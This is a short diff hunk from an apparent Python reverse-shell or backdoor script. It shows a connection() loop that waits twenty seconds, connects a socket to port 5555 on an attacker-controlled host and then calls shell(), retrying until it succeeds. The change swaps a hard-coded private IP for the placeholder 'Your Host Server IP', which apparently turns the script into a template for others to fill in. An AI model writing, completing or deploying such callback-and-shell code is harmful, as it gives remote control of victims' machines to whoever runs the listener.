@@ -25,7 +25,7 @@ def connection():
 	while True:
 		time.sleep(20)
 		try:
-			s.connect(('10.34.39.191',5555))
+			s.connect(('Your Host Server IP',5555))
 			shell()
 			s.close()
 			break
